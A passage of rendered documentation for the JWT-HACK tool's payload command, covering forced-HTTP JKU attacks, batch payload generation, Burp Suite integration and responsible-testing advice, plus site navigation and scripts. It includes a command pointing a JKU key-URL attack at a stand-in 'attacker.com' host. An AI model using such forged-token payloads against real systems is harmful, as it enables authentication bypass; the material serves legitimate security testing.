+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Force HTTP for testing</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=jku --jwk-protocol=http --jwk-attack=attacker.com</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Test protocol downgrade vulnerabilities</span></span></code></pre><h2 id="integration-with-testing-frameworks">Integration with Testing Frameworks</h2>
+<h3 id="burp-suite-integration">Burp Suite Integration</h3>
+<ol>
+<li>Generate payloads with JWT-HACK</li>
+<li>Import into Burp Intruder</li>
+<li>Use as payload list for systematic testing</li>
+</ol>
+<h3 id="custom-scripts">Custom Scripts</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #6A737D;"># Generate and test programmatically</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">jwt-hack</span><span style="color: #9ECBFF;"> payload</span><span style="color: #F97583;"> &lt;</span><span style="color: #9ECBFF;">TOKE</span><span>N</span><span style="color: #F97583;">&gt;</span><span style="color: #79B8FF;"> --target=all</span><span style="color: #F97583;"> &gt;</span><span style="color: #9ECBFF;"> payloads.txt</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #6A737D;"># Process payloads in custom testing script</span></span>
+<span class="giallo-l"><span style="color: #F97583;">while</span><span style="color: #79B8FF;"> read</span><span style="color: #9ECBFF;"> payload</span><span>;</span><span style="color: #F97583;"> do</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">    test_jwt_payload</span><span style="color: #9ECBFF;"> &quot;</span><span>$payload</span><span style="color: #9ECBFF;">&quot;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">done &lt;</span><span> payloads.txt</span></span></code></pre><h2 id="best-practices">Best Practices</h2>
+<h3 id="responsible-testing">Responsible Testing</h3>
+<ul>
+<li>Only test applications you own or have permission to test</li>
+<li>Document all findings appropriately</li>
+<li>Follow responsible disclosure practices</li>
+</ul>
+<h3 id="comprehensive-coverage">Comprehensive Coverage</h3>
+<ul>
+<li>Test all payload types systematically</li>
+<li>Combine with other testing techniques</li>
+<li>Verify results manually when automated tools indicate vulnerabilities</li>
+</ul>
+
+
+    
+    
+
+    
+
+
+                        
+
+
+
+                        <nav class="mt-12 pt-8 border-t border-gray-500/15">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div class="prev-nav-item">
+                                    
+    
+        
+        <a class="nav-button nav-button-prev group" href="https://jwt-hack.hahwul.com/usage/commands/">
+            <div class="nav-button-content">
+                <div class="nav-button-direction">
+                    <svg class="w-5 h-5 transition-transform group-hover:-translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                    </svg>
+                    <span class="nav-button-label">Back to</span>
+                </div>
+                <div class="nav-button-title">Commands</div>
+            </div>
+        </a>
+    
+
+                                </div>
+                                <div class="next-nav-item">
+                                    
+    
+        <a class="nav-button nav-button-next group" href="https://jwt-hack.hahwul.com/usage/commands/mcp/">
+            <div class="nav-button-content">
+                <div class="nav-button-direction">
+                    <span class="nav-button-label">Next</span>
+                    <svg class="w-5 h-5 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+                    </svg>
+                </div>
+                <div class="nav-button-title">MCP Server Mode</div>
+            </div>
+        </a>
+    
+
+                                </div>
+                            </div>
+                        </nav>
+                    </main>
+
+                    
+                        
+
+<div class="hidden lg:block" >
+    <div class="sticky top-20 px-4 py-2 border-l border-gray-500/15">
+        <h4 class="text-lg font-bold mb-1">ON THIS PAGE</h4>
+            <ul class="menu menu-sm toc-menu">
+            
+                <li>
+                    
+                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#basic-usage" class="toc-link">Basic Usage</a>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#attack-payload-types" class="toc-link">Attack Payload Types</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#none-algorithm-attack" class="toc-link">None Algorithm Attack</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#algorithm-confusion-attack" class="toc-link">Algorithm Confusion Attack</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#jku-x5u-url-attacks" class="toc-link">JKU&#x2F;X5U URL Attacks</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#kid-sql-injection" class="toc-link">KID SQL Injection</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#x5c-certificate-injection" class="toc-link">X5C Certificate Injection</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#cty-content-type-attacks" class="toc-link">CTY Content Type Attacks</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#generate-all-payload-types" class="toc-link">Generate All Payload Types</a>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#command-options" class="toc-link">Command Options</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#required" class="toc-link">Required</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#target-selection" class="toc-link">Target Selection</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#jku-x5u-attack-options" class="toc-link">JKU&#x2F;X5U Attack Options</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#output-format" class="toc-link">Output Format</a>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#attack-scenarios" class="toc-link">Attack Scenarios</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#testing-authentication-bypass" class="toc-link">Testing Authentication Bypass</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#algorithm-confusion-testing" class="toc-link">Algorithm Confusion Testing</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#key-url-manipulation" class="toc-link">Key URL Manipulation</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#sql-injection-in-kid" class="toc-link">SQL Injection in KID</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#security-testing-workflow" class="toc-link">Security Testing Workflow</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#1-reconnaissance" class="toc-link">1. Reconnaissance</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#2-systematic-testing" class="toc-link">2. Systematic Testing</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#3-advanced-attacks" class="toc-link">3. Advanced Attacks</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#payload-customization" class="toc-link">Payload Customization</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#custom-domains" class="toc-link">Custom Domains</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#protocol-selection" class="toc-link">Protocol Selection</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#integration-with-testing-frameworks" class="toc-link">Integration with Testing Frameworks</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#burp-suite-integration" class="toc-link">Burp Suite Integration</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#custom-scripts" class="toc-link">Custom Scripts</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+                <li>
+                    
+                    <details class="toc-details" >
+                        <summary>
+                            <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#best-practices" class="toc-link">Best Practices</a>
+                        </summary>
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#responsible-testing" class="toc-link">Responsible Testing</a>
+                                </li>
+                            
+                                <li>
+                                    <a href="https://jwt-hack.hahwul.com/usage/commands/payload/#comprehensive-coverage" class="toc-link">Comprehensive Coverage</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                    
+                </li>
+            
+            </ul>
+    </div>
+</div>
+
+
+                    
+                    
+                </div>
+            </div>
+            
+
+            <script>
+              // Determine theme: localStorage > extra.default_colorset > goyo-dark
+              // Expose theme config for global use (e.g., goyo.js)
+              
+              
+              
+                  
+                  
+                  
+                  
+              
+              window.defaultColorset = "dark";
+              window.darkBrightness = "darker";
+              window.lightBrightness = "normal";
+              window.themeMap = { "dark": "goyo-dark", "light": "goyo-light" };
+              window.fallbackTheme = window.themeMap[window.defaultColorset] || "goyo-dark";
+
+              // Theme mapping - maps user-friendly names to actual DaisyUI theme names
+              var themeMapping = { "goyo-dark": "night", "goyo-light": "lofi" };
+              var currentUserTheme = localStorage.getItem('theme') || window.fallbackTheme;
+              var actualTheme = themeMapping[currentUserTheme] || currentUserTheme;
+
+              // Initialize and run Mermaid only when loaded
+              window.initMermaid = function() {
+                var mermaidTheme = "dark";
+                if(currentUserTheme == "goyo-light") {
+                  mermaidTheme = "light";
+                }
+
+                if (typeof mermaid !== 'undefined') {
+                  mermaid.initialize({ startOnLoad: false, theme: mermaidTheme });
+
+                  // Function to render mermaid diagrams
+                  var renderMermaid = async function() {
+                    const mermaidElements = document.querySelectorAll('.mermaid');
+                    if (mermaidElements.length > 0) {
+                        await mermaid.run({
+                            nodes: mermaidElements
+                        });
+                    }
+                  };
+
+                  // Check if DOMContentLoaded has already fired
+                  if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', renderMermaid);
+                  } else {
+                    // DOMContentLoaded already fired, run immediately
+                    renderMermaid();
+                  }
+                }
+              };
+
+              // Auto-initialize if Mermaid is already loaded
+              if (typeof mermaid !== 'undefined') {
+                window.initMermaid();
+              }
+            </script>
+
+        </div>
+
+        
+        
+        
+        
+        
+        <div id="sidebar" class="drawer-side pt-16 border-e border-gray-500&#x2F;15 overflow-hidden">
+            
+                
+
+
+
+    
+
+
+
+    
+
+<label for="my-drawer-2" class="drawer-overlay"></label>
+<div class="pt-4 w-68 h-[calc(100vh-4rem)] bg-base-100 text-base-content flex flex-col overflow-auto thin-scrollbar">
+    
+    <div class="px-2 pt-4 pb-0 flex flex-col items-center gap-2">
+        <div class="w-full flex items-center gap-2">
+            <label for="search-modal" class="input w-full flex items-center justify-between text-left bg-base-100 cursor-pointer border-gray-500/15 hover:border-gray-500/55 hover:border-1 transition" aria-label="검색">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+                </svg>
+                <span class="text-gray-400"><kbd class="kbd">⌘</kbd><kbd class="kbd">K</kbd></span>
+            </label>
+        </div>
+    </div>
+    
+    <ul class="menu w-full flex-grow">
+        
+        
+        
+        
+            
+            <li>
+                
+                    <details >
+                        <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/get_started">Get Started</a></summary>
+                        <ul>
+                            
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/get_started/introduction">Introduction</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/get_started/installation">Installation</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/get_started/quickstart">Quick Start</a></li>
+                            
+                            
+                        </ul>
+                    </details>
+                
+            </li>
+        
+            
+            <li>
+                
+                    <details open>
+                        <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage">Usage</a></summary>
+                        <ul>
+                            
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/options">Options &amp; Flags</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/configuration">Configuration</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/examples">Examples</a></li>
+                            
+                            
+                                
+                                <li>
+                                    
+                                        <details open>
+                                            <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands">Commands</a></summary>
+                                            <ul>
+                                                
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/decode">Decode Command</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/encode">Encode Command</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/verify">Verify Command</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/crack">Crack Command</a></li>
+                                                
+                                                    <li class="rounded bg-gray-500/15"><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/payload">Payload Command</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/mcp">MCP Server Mode</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/scan">Scan Command</a></li>
+                                                
+                                                    <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/usage/commands/server">Server Command</a></li>
+                                                
+                                                
+                                            </ul>
+                                        </details>
+                                    
+                                </li>
+                            
+                        </ul>
+                    </details>
+                
+            </li>
+        
+            
+            <li>
+                
+                    <details >
+                        <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/advanced">Advanced</a></summary>
+                        <ul>
+                            
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/advanced/performance-optimization">Performance Optimization</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/advanced/scripting-automation">Scripting &amp; Automation</a></li>
+                            
+                            
+                        </ul>
+                    </details>
+                
+            </li>
+        
+            
+            <li>
+                
+                    <details >
+                        <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/reference">Reference</a></summary>
+                        <ul>
+                            
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/reference/environment-variables">Environment Variables</a></li>
+                            
+                            
+                        </ul>
+                    </details>
+                
+            </li>
+        
+            
+            <li>
+                
+                    <details >
+                        <summary ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/support">Support</a></summary>
+                        <ul>
+                            
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/support/troubleshooting">Troubleshooting</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/support/faq">FAQ</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/support/changelog">Changelog</a></li>
+                            
+                                <li ><a class="hover:no-underline" href="https://jwt-hack.hahwul.com/support/community">Community</a></li>
+                            
+                            
+                                
+                                <li>
+                                    <a  href="https://jwt-hack.hahwul.com/support/contributing">Contributing</a>
+                                </li>
+                            
+                        </ul>
+                    </details>
+                
+            </li>
+        
+    </ul>
+
+    
+    
+
+    
+<footer class="footer py-2 px-4 mt-2 border-t border-gray-500/50">
+    <div class="w-full">
+        <!-- Main footer content -->
+        <div class="flex flex-col items-center gap-4 mb-4">
+            <!-- Powered by section with better styling -->
+            <div class="text-center">
+                <p class="text-sm text-base-content/60 leading-relaxed">
+                    <div style='display: flex; align-items: center; justify-content: center; gap: 16px; flex-wrap: wrap;'><a href='https://www.hahwul.com' target='_blank' rel='noopener noreferrer' style='display: inline-flex; align-items: center;'><img src='https://www.hahwul.com/images/logo-gray.png' alt='HAHWUL' style='height: 30px' /></a><span style='opacity: 0.6;'>•</span><span>Powered by <a href='https://www.getzola.org' class='font-medium text-base-content/70 hover:text-base-content transition-colors duration-200'>Zola</a> and <a href='https://github.com/hahwul/goyo' class='font-medium text-base-content/70 hover:text-base-content transition-colors duration-200'>Goyo</a></span></div>
+                </p>
+            </div>
+        </div>
+
+
+    </div>
+</footer>
+
+</div>
+
+            
+        </div>
+    </div>
+
+    
+        <script>
+            window.GOYO_CONFIG = {
+                defaultThemeDark: "goyo-dark",
+                defaultThemeLight: "goyo-light",
+            };
+        </script>
+        <script type="text/javascript" src="https://jwt-hack.hahwul.com/goyo.js"></script>
+        
+        <!-- Lazy load search functionality -->
+        <script>
+            var searchLoaded = false;
+            var searchLoadCallbacks = [];
+
+            function loadSearchLibraries(callback) {
+                // If already loaded, execute callback immediately
+                if (searchLoaded && typeof Fuse !== 'undefined' && window.searchIndex) {
+                    if (callback) callback();
+                    return;
+                }
+
+                // Add callback to queue
+                if (callback) searchLoadCallbacks.push(callback);
+
+                // If already loading, don't start again
+                if (searchLoaded) return;
+                searchLoaded = true;
+
+                // Show loading indicator in search input
+                var searchInput = document.getElementById('search');
+                if (searchInput) {
+                    searchInput.placeholder = 'Loading search...';
+                    searchInput.disabled = true;
+                }
+
+                // Load Fuse.js
+                var fuseScript = document.createElement('script');
+                fuseScript.src = 'https://jwt-hack.hahwul.com/fuse.min.js';
+
+                // Load search index after Fuse.js
+                fuseScript.onload = function() {
+                    var searchIndexScript = document.createElement('script');
+                    searchIndexScript.src = 'https://jwt-hack.hahwul.com/search_index.en.js';
+                    searchIndexScript.onload = function() {
+                        // Re-enable search input
+                        if (searchInput) {
+                            searchInput.placeholder = 'Search documentation...';
+                            searchInput.disabled = false;
+                            searchInput.focus();
+                        }
+
+                        // Initialize search functionality
+                        if (typeof initSearch === 'function') {
+                            initSearch();
+                        }
+
+                        // Execute all queued callbacks
+                        searchLoadCallbacks.forEach(function(cb) { cb(); });
+                        searchLoadCallbacks = [];
+                    };
+                    document.body.appendChild(searchIndexScript);
+                };
+
+                document.body.appendChild(fuseScript);
+            }
+
+            // Load search on first interaction with search modal
+            document.addEventListener('DOMContentLoaded', function() {
+                var searchModal = document.getElementById('search-modal');
+                if (searchModal) {
+                    searchModal.addEventListener('change', function() {
+                        if (this.checked) {
+                            loadSearchLibraries();
+                        }
+                    });
+                }
+
+                // Also load on Ctrl+K / Cmd+K
+                document.addEventListener('keydown', function(e) {
+                    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                        loadSearchLibraries();
+                    }
+                });
+            });
+        </script>
+        
+    
+</body>
+</html>
